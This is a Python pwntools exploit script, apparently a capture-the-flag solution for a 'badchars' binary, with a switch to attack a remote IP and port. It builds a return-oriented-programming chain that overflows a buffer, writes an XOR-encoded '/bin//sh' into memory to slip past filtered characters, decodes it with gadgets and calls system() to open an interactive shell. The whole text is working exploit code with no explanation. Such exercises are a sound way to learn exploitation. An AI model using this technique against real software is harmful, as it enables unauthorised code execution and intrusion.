#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']
context.arch = 'amd64'

local = 1

if local:
	cn = process('./badchars')
	# bin = ELF('./task_shoppingCart',checksec=False)
	# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
	# libc = ELF('/lib/i386-linux-gnu/libc.so.6',checksec=False)

else:
	cn = remote('117.78.27.105', 30403)
	# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
	pass


def z(a=''):
	if local:
		gdb.attach(cn,a)
		if a == '':
			raw_input()

pop_r14_r15 = 0x0400b40 # pop r14; pop r15; ret;
xor_r15_r14 = 0x0400b30 # xor byte ptr [r15], r14b; ret

mov_r13_r12 = 0x00400b34 # mov qword ptr [r13], r12; ret;
pop_r12_r13 = 0x00400b3b # pop r12; pop r13; ret;

pop_rdi = 0x00400b39 # pop rdi; ret;

xor_encode = 0x21
system_add = 0x04006F0

segment_add = 0x00601080
bin_sh = '/bin//sh'
encode_str = ''

for i in bin_sh:
	encode_str += chr(ord(i)^xor_encode)

print encode_str

z('b*0x04009DE\nc')

payload = 'A'*0x20+ 'BBBBBBBB'
payload += p64(pop_r12_r13)
payload += encode_str
payload += p64(segment_add) + p64(mov_r13_r12)

for i in xrange(8):
	payload += p64(pop_r14_r15) + p64(0x21) + p64(segment_add + i) + p64(xor_r15_r14)

cn.recvuntil('n s\n')

payload += p64(pop_rdi) + p64(segment_add) + p64(system_add) + p64(0)
cn.sendline(payload)

cn.interactive()
